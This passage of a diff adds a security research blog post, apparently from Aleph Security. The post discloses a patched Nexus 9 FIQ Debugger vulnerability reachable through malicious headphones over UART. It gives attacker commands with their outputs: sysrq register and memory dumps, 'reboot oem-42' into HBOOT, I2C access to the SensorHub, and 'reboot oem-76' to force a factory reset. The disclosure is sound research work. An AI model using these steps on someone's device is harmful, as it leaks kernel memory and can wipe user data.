+	<span class="k">if</span> <span class="p">(</span><span class="n">sysrq_on</span><span class="p">())</span>
+		<span class="n">__handle_sysrq</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">bool</span> <span class="nf">sysrq_on</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="n">sysrq_enabled</span> <span class="o">||</span> <span class="n">sysrq_always_enabled</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>By instrumenting the kernel we witnessed that when the platform is up, both <code class="language-plaintext highlighter-rouge">sysrq_enabled</code> and <code class="language-plaintext highlighter-rouge">sysrq_always_enabled</code> are 0, thus <code class="language-plaintext highlighter-rouge">sysrq_on</code> returns <code class="language-plaintext highlighter-rouge">false</code>. The value of the latter can be set to 1 by providing a kernel parameter (which is not provided on Nexus 9, thus the value is 0):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__setup</span><span class="p">(</span><span class="s">"sysrq_always_enabled"</span><span class="p">,</span> <span class="n">sysrq_always_enabled_setup</span><span class="p">);</span>
+</code></pre></div></div>
+<p>The default value of <code class="language-plaintext highlighter-rouge">sysrq_enabled</code>, however, is 1:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__read_mostly</span> <span class="n">sysrq_enabled</span> <span class="o">=</span> <span class="n">SYSRQ_DEFAULT_ENABLE</span><span class="p">;</span>
+</code></pre></div></div>
+<p>where under sysrq.h:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Enable/disable SYSRQ support by default (0==no, 1==yes). */</span>
+<span class="cp">#define SYSRQ_DEFAULT_ENABLE	1
+</span></code></pre></div></div>
+<p>Therefore something must change the variable’s value to 0, and indeed, this is done by an Android init script (<code class="language-plaintext highlighter-rouge">init.rc</code>):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...]
+on early-init
+<span class="c"># Set init and its forked children's oom_adj.</span>
+    write /proc/1/oom_score_adj <span class="nt">-1000</span>
+
+    <span class="c"># Disable sysrq from keyboard</span>
+    write /proc/sys/kernel/sysrq 0
+<span class="o">[</span>...]
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/sysrq</code> proc file is backed by code under <code class="language-plaintext highlighter-rouge">kernel/sysctl.c</code>, that eventually toggles <code class="language-plaintext highlighter-rouge">sysrq_enabled</code>.
+Hence there is a short window of time at which <code class="language-plaintext highlighter-rouge">sysrq</code> is enabled – during the kernel’s boot, before the <code class="language-plaintext highlighter-rouge">init</code> script is executed. Indeed:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>sysrq
+<span class="go">[  387.104381] SysRq : HELP : loglevel(0-9) reboot(b) crash(c) terminate-all-tasks(e) memory-full-oom-kill(f) kill-all-tasks(i) thaw-filesystems(j) show-backtrace-all-active-cpus(l) show-memory-usage(m) nice-all-RT-tasks(n) poweroff(o) show-registers(p) show-all-timers(q) sync(s) show-task-states(t) unmount(u) show-blocked-tasks(w) dump-ftrace-buffer(z)
+</span><span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">sysrq</code> interface provides additional commands beyond the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>. For example, we can change the kernel logging level in order to leak more debugging messages:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>sysrq 9
+<span class="go">[44984.239043] SysRq : Changing Loglevel
+[44984.242969] Loglevel set to 9
+</span><span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Moreover, a lucky attacker can also dereference some registers:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>sysrq p
+<span class="go">[   62.412493] SysRq : Show Regs
+[   62.415673]
+</span><span class="gp">[   62.417182] CPU: 0 PID: 1 Comm: swapper/0 Tainted: G        W    3.10.101-ga139acc-dirty #</span>22
+<span class="go">[   62.425653] task: ffffffc06e4f0000 ti: ffffffc06e4f8000 task.ti: ffffffc06e4f8000
+[   62.433176] PC is at common_edp_calculate_leakage_ma+0xf0/0x1b0
+[   62.439120] LR is at cpu_edp_calculate_maxf.constprop.5+0xec/0x16c
+</span><span class="gp">[   62.445326] pc : [&lt;ffffffc0007bfb34&gt;</span><span class="o">]</span> lr : <span class="o">[</span>&lt;ffffffc0007c0ab8&gt;] pstate: 80000105
+<span class="go">[   62.452746] sp : ffffffc06e4fbc10
+[   62.456073] x29: ffffffc06e4fbc10 x28: 00000000000000bc
+[   62.461431] x27: 000000000024c516 x26: ffffffc000fecd1c
+[   62.466784] x25: ffffffc0029ca000 x24: 000000000000043a
+[   62.472136] x23: 0000000000000001 x22: 0000000000000032
+[   62.477487] x21: 00000000000038a4 x20: 0000000000000000
+[   62.482839] x19: 00000000000004a6 x18: 00000000f31a2dd9
+[   62.488190] x17: 00000000000003e8 x16: ffffffc000fece0c
+[   62.493542] x15: ffffffc000fece1c x14: 000000000000000a
+[   62.498892] x13: 00000000000003e8 x12: 000000000000004f
+[   62.504243] x11: 0000000000000003 x10: 0000000000000001
+[   62.509594] x9 : ffffffc000fece1c x8 : 0000000000000000
+[   62.514946] x7 : 00000001de5571ae x6 : 00000000000003e8
+[   62.520297] x5 : 0000000000000000 x4 : 0000000000000001
+[   62.525648] x3 : 00000000000004a6 x2 : 0000000000000032
+[   62.530998] x1 : 000000000000043a x0 : ffffffc000fecd1c
+[   62.536351]
+[...]
+[   62.679272] SP: 0xffffffc06e4fbb90:
+[   62.684252] bb90  00000000 00000000 000038a4 00000000 00000032 00000000 00000001 00000000
+[   62.692569] bbb0  0000043a 00000000 029ca000 ffffffc0 00fecd1c ffffffc0 0024c516 00000000
+[   62.700877] bbd0  000000bc 00000000 6e4fbc10 ffffffc0 007c0ab8 ffffffc0 6e4fbc10 ffffffc0
+[   62.709185] bbf0  007bfb34 ffffffc0 80000105 00000000 6e4fbc20 ffffffc0 0019e648 ffffffc0
+[   62.717492] bc10  6e4fbc80 ffffffc0 007c0ec8 ffffffc0 00fb7ad0 ffffffc0 00000001 00000000
+[   62.725802] bc30  0000043a 00000000 00b04950 ffffffc0 00000004 00000000 00fecd18 ffffffc0
+[   62.734112] bc50  00000008 00000000 00fed000 ffffffc0 00b04938 ffffffc0 02ab0e38 ffffffc0
+[   62.742420] bc70  00fecd18 ffffffc0 00fecd20 ffffffc0 6e4fbd30 ffffffc0 007c1398 ffffffc0
+[   62.750730]
+[...]
+[   62.822184] X9: 0xffffffc000fecd9c:
+[   62.827164] cd9c  098d9dee f7aaea26 01dcf41d ffe51191 f612bd90 08a38fc6 fe10cb55 001bef19
+[   62.835473] cdbc  035e5fbc fd132501 00a7fbcb fff68ae6 01094554 ff18cbd7 00332efc fffd1caf
+[   62.843780] cddc  fcb5f0c0 02dd5bec ff5d739e 00092ca9 03687eeb fd089f6c 00a88d3e fff67c13
+[   62.852088] cdfc  fed8fb7d 0100cbc6 ffc6e9e4 00033901 ffe66261 001649f3 fffb14fa 00004711
+[   62.860394] ce1c  00513c1e ffb95bec 000f9b9c ffff1e4d ffabecea 00491195 ffefd49f 0000e9f8
+[   62.868701] ce3c  001c65ef ffe752cc 00057876 ffffb0ce 0000001e 002625a0 00231860 00000000
+[   62.877008] ce5c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[   62.885315] ce7c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[...]
+</span></code></pre></div></div>
+<h2 id="hboot">HBOOT</h2>
+<p>Our next step was trying to understand if we are limited to the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> prompt, or there are some more hidden gems.</p>
+<p>The Nexus 9 bootloader has two modes: <code class="language-plaintext highlighter-rouge">HBOOT</code> and <code class="language-plaintext highlighter-rouge">FASTBOOT</code>, which can be interchanged via the bootloader UI:</p>
+<div class="nakedtable">
+<table>
+<thead>
+<tr>
+<th style="text-align: center"><img src="/assets/img/n9-fboot.jpg" alt="Nexus 9 FASTBOOT menu" /></th>
+<th style="text-align: center"><img src="/assets/img/n9-hboot.jpg" alt="Nexus 9 HBOOT menu" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center"><strong>FASTBOOT menu</strong></td>
+<td style="text-align: center"><strong>HBOOT menu</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>We noticed that when we entered the <code class="language-plaintext highlighter-rouge">HBOOT</code> mode, another prompt was received via <code class="language-plaintext highlighter-rouge">UART</code> (through the headphones jack):</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="c">##[ Bootloader Mode ]###</span>
+<span class="gp">hboot&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Hitting <code class="language-plaintext highlighter-rouge">?</code> shows the available commands:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hboot&gt;</span><span class="w"> </span>?
+<span class="gp">  #</span><span class="nb">.</span> &lt;<span class="nb">command</span><span class="o">&gt;</span>               : &lt;brief description&gt;
+<span class="go">security_command:
+  1. boot                    : no desc.
+</span><span class="c">...
+</span><span class="go"> 14. readconfig              : no desc.
+ 15. readimei                : no desc.
+ 16. readmeid                : no desc.
+ 17. readpid                 : no desc.
+ 18. rebootRUU               : no desc.
+ 19. refurbish               : no desc.
+ 20. reset                   : no desc.
+ 21. resethtcdebugflag       : no desc.
+ 22. usb_id_adc              : no desc.
+ 23. i2cr                    : no desc.
+ 24. i2cw                    : no desc.
+ 25. i2crNoAddr              : no desc.
+ 26. i2cwNoAddr              : no desc.
+ 27. i2cdetect               : no desc.
+</span><span class="c">...
+</span><span class="gp">hboot&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="42-answer-to-the-ultimate-question-of-life-the-universe-and-everything">42: Answer to the Ultimate Question of Life, the Universe, and Everything</h2>
+<p>It can be seen that through this interface we can trigger many interesting operations. From the attacker’s prespective, however, it is very unlikely that the victim would plug-in the headphones while the device is in the <code class="language-plaintext highlighter-rouge">HBOOT</code> mode.
+As explained above, normally, when the victim plugs-in the malicious headphones, the latter will be able to interact with the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>, implemented by the platform.
+So how can the attacker force a reboot to <code class="language-plaintext highlighter-rouge">HBOOT</code> from the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>? The answer is, unsurprisingly, <a href="https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#Answer_to_the_Ultimate_Question_of_Life.2C_the_Universe.2C_and_Everything_.2842.29"><strong>42</strong></a>:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>reboot oem-42
+<span class="gp">debug&gt;</span><span class="w">
+</span><span class="go">[0000.045] Battery Present
+[0000.069] Battery Voltage: 4170 mV
+[0000.072] Battery charge sufficient
+[0000.076] Override BCT configs
+[0000.079] NvBootEmcReadMrr+++
+[0000.082] NvBootEmcReadMrr---
+</span><span class="c">....
+</span><span class="gp">#</span><span class="c">##[ Bootloader Mode ]###</span>
+<span class="gp">hboot&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>Great, we can now easily access the <code class="language-plaintext highlighter-rouge">HBOOT</code> interface via <code class="language-plaintext highlighter-rouge">UART</code>.</p>
+<h2 id="accessing-i2c-buses">Accessing I\(^2\)C Buses</h2>
+<p>By having <code class="language-plaintext highlighter-rouge">HBOOT</code> access, the attacker can interact with I\(^2\)C accessible SoCs. Detecting the available SoCs can be done using the <code class="language-plaintext highlighter-rouge">i2cdetect</code> <code class="language-plaintext highlighter-rouge">HBOOT</code> command. The following shows the devices which listen on I\(^2\)C bus <code class="language-plaintext highlighter-rouge">0</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hboot</span><span class="o">&gt;</span> <span class="n">i2cdetect</span> <span class="mi">0</span>
+<span class="n">i2c</span> <span class="n">device</span> <span class="mh">0x66</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0x67</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0x6c</span> <span class="n">found</span>
+<span class="n">i2c</span> <span class="n">device</span> <span class="mh">0x6d</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0x98</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0x99</span> <span class="n">found</span>
+<span class="n">i2c</span> <span class="n">device</span> <span class="mh">0xd6</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0xd7</span> <span class="n">foundi2c</span> <span class="n">device</span> <span class="mh">0xe4</span> <span class="n">found</span>
+<span class="n">i2c</span> <span class="n">device</span> <span class="mh">0xe5</span> <span class="n">found</span>
+<span class="n">hboot</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>For example, <code class="language-plaintext highlighter-rouge">0xe4</code> and <code class="language-plaintext highlighter-rouge">0xe5</code> are the read/write addresses of the <code class="language-plaintext highlighter-rouge">HTC SensorHub</code>, implemented on an <code class="language-plaintext highlighter-rouge">STM32F401 ARM Cortex-M4</code> SoC. <code class="language-plaintext highlighter-rouge">SensorHub</code>, as the name implies acts as an energy-efficient proxy between the main CPU and the actual sensors. It communicates with both ends using I\(^2\)C (different buses). Since the <code class="language-plaintext highlighter-rouge">STM32F401</code> bootloader supports <a href="http://www.st.com/content/ccc/resource/technical/document/application_note/4c/68/fe/72/a8/cd/47/83/DM00072315.pdf/files/DM00072315.pdf/jcr:content/translations/en.DM00072315.pdf">programming via I\(^2\)C</a>, our ultimate goal was to replace the SensorHub firmware via I\(^2\)C, just like the platform driver does. Unfortunately we soon found out it was not possible because booting STM32F4 to its bootloader <a href="http://www.st.com/content/ccc/resource/technical/document/application_note/b9/9b/16/3a/12/1e/40/0c/CD00167594.pdf/files/CD00167594.pdf/jcr:content/translations/en.CD00167594.pdf">requires</a> being able to reset the SoC while the <code class="language-plaintext highlighter-rouge">Boot0</code> and <code class="language-plaintext highlighter-rouge">Boot1</code> pins are set to 1 and 0, correspondingly, but we cannot control these pins via <code class="language-plaintext highlighter-rouge">HBOOT</code>. Out of curiosity, we digged in the SensorHub driver, <a href="https://android.googlesource.com/kernel/tegra/+/android-7.1.1_r0.13/drivers/i2c/chips/CwMcuSensor.c">CwMcuSensor</a> to see how it performs the firmware upgrade. Indeed it enables the <code class="language-plaintext highlighter-rouge">Boot0</code> pin, via <code class="language-plaintext highlighter-rouge">GPIO</code> (the other pin is probably pulled-down):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">update_firmware</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">firmware</span> <span class="o">*</span><span class="n">fw</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">context</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">...</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">check_fw_version</span><span class="p">(</span><span class="n">mcu_data</span><span class="p">,</span> <span class="n">fw</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* Perform firmware update */</span>
+        <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">activated_i2c_lock</span><span class="p">);</span>
+        <span class="n">i2c_lock_adapter</span><span class="p">(</span><span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">adapter</span><span class="p">);</span>
+        <span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x39</span><span class="p">;</span>
+        <span class="n">gpio_direction_output</span><span class="p">(</span><span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">gpio_chip_mode</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">mdelay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+        <span class="n">gpio_direction_output</span><span class="p">(</span><span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">gpio_reset</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">mdelay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+        <span class="n">gpio_direction_output</span><span class="p">(</span><span class="n">mcu_data</span><span class="o">-&gt;</span><span class="n">gpio_reset</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">...</span>
+<span class="p">}</span>			
+</code></pre></div></div>
+<p>Although we miserably failed to flash <code class="language-plaintext highlighter-rouge">SensorHub</code>, we still wanted to interact with it via I\(^2\)C, proving that we can communicate with internal chips. Therefore we examined its firmware in order to find a few interesting I\(^2\)C registers.
+Returning the <strong>firmware version</strong> is done by reading from register <code class="language-plaintext highlighter-rouge">0x10</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hboot</span><span class="o">&gt;</span> <span class="n">i2cr</span> <span class="mi">0</span> <span class="mh">0xe4</span> <span class="mh">0x10</span> <span class="mi">6</span>
+<span class="n">ret</span><span class="o">:</span><span class="mi">0</span>
+     <span class="o">&gt;</span> <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span> <span class="mi">0</span> <span class="mi">10</span> <span class="mi">28</span> <span class="mi">2</span> <span class="mi">1</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span>
+<span class="n">hboot</span><span class="o">&gt;</span>     
+</code></pre></div></div>
+<p>This indeed corresponds to the firmware image’s footer: <code class="language-plaintext highlighter-rouge">HTCSHUB001.000.016.040.002.001</code>. We then managed to access an actual sensor – the <strong>Light Sensor</strong>, through SensorHub. In order to do so, we first enabled it (writing <code class="language-plaintext highlighter-rouge">32</code> to register <code class="language-plaintext highlighter-rouge">0x90</code>), and then read its value (register <code class="language-plaintext highlighter-rouge">0x23</code>):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hboot</span><span class="o">&gt;</span> <span class="n">i2cw</span> <span class="mi">0</span> <span class="mh">0xe5</span> <span class="mh">0x90</span> <span class="mi">32</span>
+<span class="n">hboot</span><span class="o">&gt;</span> <span class="n">i2cr</span> <span class="mi">0</span> <span class="mh">0xe4</span> <span class="mh">0x23</span> <span class="mi">3</span>
+<span class="n">ret</span><span class="o">:</span><span class="mi">0</span>
+     <span class="o">&gt;</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span> <span class="n">ba</span> <span class="mi">3</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span>
+</code></pre></div></div>
+<p>In a dark room register <code class="language-plaintext highlighter-rouge">0x23</code> is <code class="language-plaintext highlighter-rouge">0</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hboot</span><span class="o">&gt;</span> <span class="n">i2cr</span> <span class="mi">0</span> <span class="mh">0xe4</span> <span class="mh">0x23</span> <span class="mi">3</span>
+<span class="n">ret</span><span class="o">:</span><span class="mi">0</span>
+     <span class="o">&gt;</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span>
+</code></pre></div></div>
+<h2 id="factory-reset">Factory Reset</h2>
+<p>Lastly, the attacker can also trigger a factory reset, simply by rebooting with <code class="language-plaintext highlighter-rouge">oem-76</code>:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>reboot oem-76
+<span class="gp">debug&gt;</span><span class="w">
+</span><span class="go">[...]
+</span></code></pre></div></div>
+<p>Better back-up your data before connecting those suspicious headphones!</p>
+<h2 id="patch">Patch</h2>
+<p>Google has patched the vulnerability by reducing the capabilities of the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>. When the platform is up, it’s no longer possible to dump the registers nor reboot with an <code class="language-plaintext highlighter-rouge">oem-N</code> parameter (preventing reboots into <code class="language-plaintext highlighter-rouge">HBOOT</code> and Factory Resets):</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span><span class="nb">help</span>
+<span class="go">FIQ Debugger commands:
+ reboot        Reboot
+ reset         Hard reset
+ irqs          Interrupt status
+ sleep         Allow sleep while in FIQ
+ nosleep       Disable sleep while in FIQ
+ console       Switch terminal to console
+ ps            Process list
+</span><span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Issuing <code class="language-plaintext highlighter-rouge">reboot oem-42</code> now results in a normal reboot. As one can see, some commands are still available.</p>
+</div>
+</div>
+<br>
+<div id="disqus_thread"></div>
+<script>
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+
+var disqus_config = function () {
+this.page.url = 'https://alephsecurity.com/2017/03/08/nexus9-fiq-debugger/';  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = '/2017/03/08/nexus9-fiq-debugger'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//alephsecurity.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<script id="dsq-count-scr" src="//alephsecurity.disqus.com/count.js" async></script>
+</div>
+</div>
+</body>
+</html>
